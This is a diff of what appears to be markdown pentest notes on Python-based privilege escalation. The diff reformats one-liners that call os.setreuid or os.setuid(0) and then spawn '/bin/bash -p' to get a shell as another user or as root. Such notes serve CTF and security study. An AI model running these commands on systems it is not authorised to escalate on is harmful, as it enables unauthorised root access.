@@ -28,8 +28,9 @@ $python
 >>os.system("/bin/bash -p")
 ```
 one line command:
->python -c 'import os;os.setreuid(1001,1001);os.system("/bin/bash -p")'
-
+```
+$python -c 'import os;os.setreuid(1001,1001);os.system("/bin/bash -p")'
+```
 ## For root euid
 
 1) can use the normal euid user technique
@@ -45,5 +46,6 @@ rough idea how it works executing step by step:
 >>os.system("/bin/bash -p")
 ```
 one line command:
->python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
-
+```
+#python -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
+```
